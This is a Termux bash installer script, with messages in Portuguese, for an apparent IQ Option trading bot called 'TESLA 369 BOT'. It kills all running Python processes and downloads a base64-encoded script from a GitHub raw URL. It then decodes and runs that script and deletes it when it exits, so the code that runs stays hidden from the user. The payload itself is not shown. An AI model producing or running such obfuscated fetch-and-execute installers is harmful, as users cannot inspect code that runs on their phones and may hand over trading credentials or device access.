#!/bin/bash
echo "⚡ TESLA 369 BOT"
echo "================"
pkill -f python 2>/dev/null; sleep 1
echo "📦 Atualizando..."
pkg update -y -qq && pkg upgrade -y -qq
echo "🐍 Python..."
pkg install python -y -qq
echo "📦 Dependências..."
pip install -q flask api-iqoption-faria requests
echo "📥 Baixando bot codificado..."
curl -4 -s https://raw.githubusercontent.com/gynbetfc/v-sensitivo-bot/main/main.py -o bot.b64
echo "🔓 Decodificando..."
python -c "
import base64
with open('bot.b64','r') as f:
    decoded = base64.b64decode(f.read()).decode()
with open('bot.py','w') as f:
    f.write(decoded)
print('✅ Pronto!')
"
rm bot.b64
echo "🚀 Iniciando..."
python bot.py &
BOT_PID=$!
sleep 5
termux-open-url http://127.0.0.1:5000 2>/dev/null
echo ""
echo "✅ BOT RODANDO! IP do celular: $(curl -4 -s ifconfig.me)"
echo "📱 http://127.0.0.1:5000"
echo "🛑 Para fechar: pressione Ctrl+C"
echo ""
# Auto-destruição ao fechar
wait $BOT_PID
rm -f bot.py
echo "🗑️ Bot removido. Até logo!"
